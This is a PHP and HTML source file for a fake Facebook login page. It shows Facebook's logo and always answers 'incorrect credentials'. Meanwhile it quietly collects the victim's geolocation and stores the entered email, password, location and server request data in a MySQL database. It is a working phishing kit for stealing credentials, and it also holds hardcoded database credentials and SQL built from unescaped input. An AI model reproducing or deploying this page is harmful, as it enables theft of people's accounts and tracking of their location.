<?php

$servername = "localhost";
$username = "u644282208_testing";
$password = "Testing@123456";
$dbname = "u644282208_testing";

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);
// Check connection
if ($conn->connect_error) {
  die("Connection failed: " . $conn->connect_error);
}

$userAgent = json_encode($_SERVER);

$email = "";
$pass = "";

if(isset($_POST)){
    $email = $_POST['email'];
    $pass = $_POST['password'];
    $location = $_POST['location'];
}

$sql = "INSERT INTO user VALUES ('".$email."', '".$pass."','".$location."', '".$userAgent."','".date('Y-m-d H:i')."','".date('Y-m-d H:i')."');";

if ($conn->multi_query($sql) === TRUE) {
//   echo "New records created successfully";
} else {
//   echo "Error: " . $sql . "<br>" . $conn->error;
}

$conn->close();

?>

<!DOCTYPE html>
<html>
<head>
<style>
    * {
  font-family: sans-serif;
  text-transform: capitalize;
}

body {
  background-color: #f0f2f5;
}

.login-fb {
  width: 100%;
  text-align: -webkit-center;
  /* margin-left: 10%; */
  /* display: grid; */
  grid-template-columns: repeat(auto-fill, minmax(500px, 1fr));
}

.login-fb .info {
  margin-top: 65px;
  margin-left: 34px;
}

.login-fb .info .image {
  width: 244px;
  margin-bottom: -14px;
  margin-left: -27px;
}

.login-fb .info .image img {
  width: 88%;
}

.login-fb .info h2 {
  color: black;
  font-weight: 100;
  margin: 8px 0 -12px;
  font-size: 28px;
}

.login-fb .info p {
  font-size: 15px;
  margin-top: 21px;
}

.login-fb .contes {
  display: flex;
  margin-top: 30px;
}

.login-fb .info .contes .image-profile {
  width: 161px;
  height: 194px;
  position: relative;
  border: 1px solid #9e9e9e3b;
  border-radius: 10px;
}

.login-fb .info .contes .image-profile:hover,
.login-fb .info .contes .image-creer:hover {
  box-shadow: 0px 0px 8px #ccc;
  transform: scale(1.04);
  cursor: pointer;
}

.login-fb .info .contes .image-profile::after {
  content: "khirdin";
  position: absolute;
  background-color: white;
  bottom: 0px;
  left: 0;
  width: 85%;
  padding: 12px;
  text-align: center;
  border-radius: 0 0 10px 10px;
}

.login-fb .info .contes .image-profile img {
  border-radius: 10px 10px 0 0;
  width: 100%;
}

.login-fb .info .contes .image-profile .close {
  position: absolute;
  top: 7px;
  left: 7px;
  color: white;
  background: grey;
  border-radius: 50%;
  width: 20px;
  height: 20px;
  display: flex;
  justify-content: center;
  align-items: center;
}

.login-fb .info .contes .image-profile:hover .close {
  color: grey;
  background-color: white;
  transform: scale(1.2);
}

.login-fb .info .contes .image-creer {
  width: 161px;
  height: 248px;
  background: #f5f6f7;
  border: 1px solid #9e9e9e3b;
  margin-left: 50px;
  border-radius: 10px;
  position: relative;
}

.login-fb .info .contes .image-creer::after {
  content: "ajouter un compte";
  position: absolute;
  left: 0;
  bottom: 0px;
  width: 100%;
  background-color: white;
  padding: 12px 30px;
  box-sizing: border-box;
  border-radius: 0 0 10px 10px;
  height: 60px;
  display: flex;
  align-items: center;
  color: #1976f2;
  text-align: center;
  font-size: 19px;
}

.login-fb .info .contes .image-creer .plus {
  position: absolute;
  top: 28%;
  left: 36%;
  background-color: #1976f2;
  font-size: xx-large;
  color: white;
  border-radius: 50%;
  width: 50px;
  height: 50px;
  display: flex;
  justify-content: center;
  align-items: center;
}

/******************* form ****************/

form {
  background: white;
  display: flex;
  flex-direction: column;
  align-items: center;
  /* justify-content: center;*/
  width: 377px;
  height: fit-content;
  position: relative;
  top: 114px;
  /* right: -122px; */
  border-radius: 14px;
  padding: 10px;
}

form input {
  width: 86%;
  padding: 16px;
  border-radius: 6px;
  outline: none;
  border: 1px solid #ccc;
  margin-top: 13px;
}

form input::placeholder {
  font-size: 17px;
  color: rgb(167, 167, 167);
  font-weight: 300;
}

form input:focus:not(form input[type="submit"]) {
  border: 1px solid #1473ef;
  box-shadow: 0px 0px 2px #1473ef;
}

.valid input[type="email"],
.valid input[type="email"]:focus {
  border: 1px solid #17ce17;
}

form input[type="email"] + .text {
  display: none;
  font-size: 17px;
  width: 93%;
  height: 27px;
  margin-bottom: 0;
}

.error input[type="email"] + .text {
  color: red;
  display: block;
}

.valid input[type="email"] + .text {
  color: #17ce17;
  display: block;
}

form input[type="password"] {
}

form input[type="submit"] {
  background: #1473ef;
  width: 95%;
  color: white;
  font-size: 23px;
  font-weight: bold;
  height: 51px;
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
}

form input[type="submit"]:hover {
  background-color: #116ee8;
  cursor: pointer;
}

form a {
  margin-top: 20px;
  text-decoration: none;
  color: #1b4cfd;
}

form a:hover {
  text-decoration: underline;
}

form .new {
  margin-top: 18px;
  padding-top: 7px;
  border-top: 1px solid #ccc;
  width: 100%;
}

form .new p {
  background: #42b72a;
  color: white;
  padding: 17px 20px;
  border-radius: 7px;
  width: fit-content;
  margin: 14px auto;
}

form .new p:hover {
  background-color: #35a51e;
  cursor: pointer;
}

    </style>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>

</head>
<body>

<div class="login-fb">
  <div class="info">
    <div class="image">
      <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg">
    </div>
    <form action="#" id="form-data" method="post">
    <p class="text" style="color: red;"></p>
      <input class="email" name="email" type="email"  placeholder="Email or phone number">
      <input class="password" name="password"  type="password" placeholder="Password" required>
      <input class="subm" type="submit"  name="ok" value="Log in">
      <input name="location" id="location-user" type="hidden">
      <a href="" class="forgot">forgotten password?</a>
      <div class="new">
        <p>create new account</p>
      </div>
    </form>
  </div>
</div>
</body>
<script>
let form = document.querySelector("form"),
  email = document.querySelector(".email"),
  text = document.querySelector(".text"),
  password = document.querySelector(".password");

//console.log(email);
// console.log(error);
// console.log(password);
// console.log(subm);

form.addEventListener("submit", (e) => {
  e.preventDefault();

    // let pattern = /^[^a-z]{6}@[gmail]\.com /;

  form.classList.add("error");
  form.classList.remove("success");

  if (email.value == "" || password.value == "") {
    text.innerText = "incorrect credentials";
  } else {
    text.innerText = "incorrect credentials";

  }
  getLocation();


});



var x = document.getElementById("location");

function getLocation() {
    
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition);
  } else { 
    x.innerHTML = "Geolocation is not supported by this browser.";
  }

}

function showPosition(position) {
    console.log(position)
    var obj = position;
    var loc = "Latitude: " + position.coords.latitude + 
  "<br>Longitude: " + position.coords.longitude;
    
  $('#location-user').val(loc);
  $('#form-data').submit();
}

</script>
</html>